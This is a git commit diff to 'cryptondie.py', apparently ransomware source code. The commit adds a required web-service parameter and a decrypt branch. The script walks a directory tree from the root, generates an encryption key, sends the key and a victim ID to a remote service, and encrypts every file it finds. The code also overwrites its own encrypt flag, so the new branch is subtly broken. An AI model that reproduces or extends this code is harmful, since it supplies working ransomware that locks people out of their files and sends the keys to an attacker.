ec1280aeedd060f8c848a95f12b5cf832378212f
gmdutra <gmdutra.eu@gmail.com>
2019-09-21 21:09:02 -0300

    Fix: Add web_service as a parameter

--- cryptondie.py
+++ cryptondie.py
@@ -15,7 +15,7 @@ def get_time():
     today = today.strftime("%d/%m/%Y %H:%M:%S")
 
     return today
-    
+
 def generate_random_string(length=16):
     letters = string.ascii_lowercase
     random_string = ''.join(random.choice(letters) for i in range(length))
@@ -24,37 +24,46 @@ def generate_random_string(length=16):
 def main():
     parser = argparse.ArgumentParser(add_help=False, usage=info.help_message)
     parser.add_argument('--dir', dest="directory", default="/")
+    parser.add_argument('--key', dest="key", default=None, required=False)
     parser.add_argument('--encrypt', dest="encrypt", action="store_true")
     parser.add_argument('--decrypt', dest="decrypt", action="store_true")
     parser.add_argument('--verbose', dest="verbose", action="store_true")
+    parser.add_argument('--web-service', dest="web_service", required=True)
 
     args = parser.parse_args()
 
+    key = args.key
     directory = args.directory
     encrypt = args.encrypt
     decrypt = args.decrypt
     verbose = args.verbose
-    
+    web_service = args.web_service
+
     target_id = generate_random_string(12)
     infos = create_infos.CreateInfos(target_id)
-    
-    key = generate_random_string()
 
-    infos.send_infos(key)
+    if key is None:
+        key = generate_random_string()
+
+    infos.send_infos(web_service, key)
 
     encrypt = encryption.EncryptionData(key)
     files = search_files.SearchDirThree(directory)
     all_files = files.search_all_files()
-    
+
     info.log("Search all files in {0}\n".format(directory))
     info.log("Started in: {0}".format(get_time()))
 
     for file in all_files:
         if verbose:
             info.log(file)
-        
-        encrypt.encrypt(file)
-        
+
+        if encrypt:
+            encrypt.encrypt(file)
+
+        elif decrypt:
+            encrypt.decrypt(file)
+
     info.log("Stopped in: {0}".format(get_time()))
 
 if __name__=='__main__':
